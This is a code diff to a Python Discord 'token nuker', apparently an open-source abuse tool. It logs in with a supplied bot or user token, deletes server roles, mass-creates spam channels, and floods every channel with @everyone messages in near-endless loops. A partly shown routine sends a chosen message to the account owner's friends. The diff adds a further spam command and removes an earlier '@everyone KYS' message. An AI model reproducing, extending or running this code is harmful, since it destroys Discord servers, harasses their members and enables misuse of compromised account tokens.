@@ -1,6 +1,6 @@
-#MIT License
-#Copyright (c) 2023 meowistic
-#https://github.com/meowistic/discord-token-nuker
+# MIT License
+# Copyright (c) 2023 meowistic
+# https://github.com/meowistic/discord-token-nuker
 
 # DO NOT DELETE THE FIRST 3 LINES OF THIS CODE!!!
 
@@ -15,25 +15,32 @@ import random
 from time import sleep
 from colorama import Back
 import json
-
-
+import os
 
 colorama.init()
 
+def clear():
+    from sys import platform
+    if platform == "linux" or platform == "linux2":
+        os.system("clear")
+
+    elif platform == "win32":
+        os.system("cls")
+
+
+# Windows...
+
 print(Fore.LIGHTBLUE_EX + rf'''
 Version 0.5
-
 meow   __  __ _____ _____        ___ ____      _   _ _   _ _  _______ ____    meow
 meow  |  \/  | ____/ _ \ \      / ( ) ___|    | \ | | | | | |/ / ____|  _ \   meow
 meow  | |\/| |  _|| | | \ \ /\ / /|/\___ \    |  \| | | | | ' /|  _| | |_) |  meow
 meow  | |  | | |__| |_| |\ V  V /    ___) |   | |\  | |_| | . \| |___|  _ <   meow
 meow  |_|  |_|_____\___/  \_/\_/    |____/    |_| \_|\___/|_|\_\_____|_| \_\  meow
-
 Bot/Account nuker
 ''')
-print(Fore.WHITE+ """
+print(Fore.WHITE + """
 https://github.com/meowistic
-
 """)
 
 try:
@@ -45,10 +52,11 @@ except FileNotFoundError:
     print(Back.LIGHTRED_EX + Fore.BLACK + "[#] Warning: config.json wasn't found." + Back.RESET)
 
 if token != "":
+    tokenm = token[:-50]
+    print(Fore.YELLOW+ f"[*] Token imported from config [{tokenm+'*'*50}]")
     pass
 else:
     token = input(Fore.LIGHTBLUE_EX + "[?] Enter Your Bot/User Token: ")
-
 
 heads = [
     {
@@ -89,6 +97,7 @@ def getheaders(token=None):
         headers.update({"Authorization": token})
     return headers
 
+
 def vtoken(token):
     try:
         with open("config.json", "r") as f:
@@ -97,7 +106,7 @@ def vtoken(token):
             amount = f["amount"]
             nick = f["nickname"]
             prefix = f["prefix"]
-            if amount != "" and prefix != "" and toke != "" and nick != "":
+            if amount != "" or prefix != "" or toke != "" or nick != "":
                 print(Fore.GREEN + "[+] Config successfully loaded.")
             else:
                 pass
@@ -106,8 +115,6 @@ def vtoken(token):
 
     except FileNotFoundError:
         print(Back.LIGHTRED_EX + Fore.BLACK + "[#] Warning: config.json wasn't found." + Back.RESET)
-
-
 
     url = "https://discord.com/api/v9/users/@me"
 
@@ -147,7 +154,8 @@ def vtoken(token):
                 while True:
                     try:
 
-                        amount = int(input(Fore.LIGHTBLUE_EX + "[?] Channel Amount (how many channels you'd like to create): "))
+                        amount = int(
+                            input(Fore.LIGHTBLUE_EX + "[?] Channel Amount (how many channels you'd like to create): "))
                     except ValueError:
                         print(Fore.RED + "[-] Invalid input! It has to be a number.")
 
@@ -158,16 +166,14 @@ def vtoken(token):
 
             amount = int(amount)
             if amount >= 200:
-
-                print(Back.LIGHTRED_EX+ Fore.BLACK + "[#] Warning: Your channel amount is over 200, which could cause the bot to get ratelimited a lot and the bot being blocked. Proceed with caution."+ Back.RESET)
-
+                print(
+                    Back.LIGHTRED_EX + Fore.BLACK + "[#] Warning: Your channel amount is over 200, which could cause the bot to get ratelimited a lot and the bot being blocked. Proceed with caution." + Back.RESET)
 
             nick = nick.upper()
             SPAM_CHANNEL = f"nuked by {nick}"
-            SPAM_MESSAGE = f"@everyone NUKED BY {nick}", "@everyone KYS", f"@everyone {nick} BEAMED THIS BOT", "@everyone gf = getfucked"
+            SPAM_MESSAGE = f"@everyone NUKED BY {nick}", f"@everyone {nick} BEAMED THIS BOT"
 
             bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
-
 
             @bot.event
             async def on_ready():
@@ -175,13 +181,33 @@ def vtoken(token):
                 print("[+] Logged in as " + bot.user.name)
                 print(Fore.YELLOW + f"[*] Waiting for command... ({prefix}meow)")
 
-
-
             @bot.command()
             async def stop(ctx):
-                await ctx.reply('> **BOT HAS SHUT DOWN SUCCESSFULLY**')
-                await bot.close()
+                await ctx.author.send('> **BOT HAS SHUT DOWN SUCCESSFULLY**')
                 exit()
+
+            @bot.command()
+            async def pause(ctx):
+            
+                print(Fore.YELLOW + "[*] Bot successfully stopped!")
+                raise Exception("stopped")
+
+            @bot.command()
+            async def resume(ctx):
+                
+                guild = ctx.guild
+
+
+                for channel in guild.channels:
+                    try:
+                        for i in range(999999999):
+                            r = random.choice(SPAM_MESSAGE)
+                            await channel.send(r)
+                            print(Fore.LIGHTGREEN_EX + f"[+] [+] Successfully spammed message: {r} [x{i}]" + Fore.RESET)
+                            clear()
+
+                    except:
+                        print(Fore.RED + f"[-] Failed to spam message: {r}" + Fore.RESET)
 
 
 
@@ -206,24 +232,24 @@ def vtoken(token):
                     except:
                         print(Fore.RED + f"[-] Couldn't delete {role.name}" + Fore.RESET)
 
-
-
-
                 for i in range(amount):
                     await guild.create_text_channel(SPAM_CHANNEL)
                 print(Fore.YELLOW + f"[*] {guild.name} has been nuked!")
                 return
 
-
             @bot.event
             async def on_guild_channel_create(channel):
-                while True:
-                    
-                    r = random.choice(SPAM_MESSAGE)
-                    await channel.send(r)
+                try:
+                    for i in range(9999999):
+                        r = random.choice(SPAM_MESSAGE)
+                        await channel.send(r)
 
-                    print(Fore.LIGHTGREEN_EX + f"[+] Successfully spammed message: {r}" + Fore.RESET)
-
+                        print(Fore.LIGHTGREEN_EX + f"[+] Successfully spammed message: {r} [x{i}]" + Fore.RESET)#
+                        clear()
+                except Exception:
+                    print(
+                        Fore.YELLOW + "[*] If you see this message, the exception has been passed and the bot stopped spamming.")
+                    return
 
 
             bot.run(token)
@@ -243,14 +269,6 @@ def vtoken(token):
         else:
             nick = input(Fore.LIGHTBLUE_EX + "[?] what is your internet nickname (NUKED BY {nickname}): ")
 
-
-
-
-
-
-
-
-
         def nuke(token, Server_Name, message_Content):
             try:
                 with open("config.json", "r") as f:
@@ -268,7 +286,6 @@ def vtoken(token):
 
             except FileNotFoundError:
                 print(Back.LIGHTRED_EX + Fore.BLACK + "[#] Warning: config.json wasn't found." + Back.RESET)
-
 
             print(Fore.LIGHTGREEN_EX + "[+] Starting nuke...")
 
@@ -351,14 +368,12 @@ def vtoken(token):
             input()
             exit()
 
-
-
-
         Server_Name = f"{nick} ON TOP"
 
         message_Content = str(input(
             Fore.LIGHTBLUE_EX + "[?] Message to send to the user's friends: "))
 
         nuke(token=token, Server_Name=Server_Name, message_Content=message_Content)
+
 
 vtoken(token)
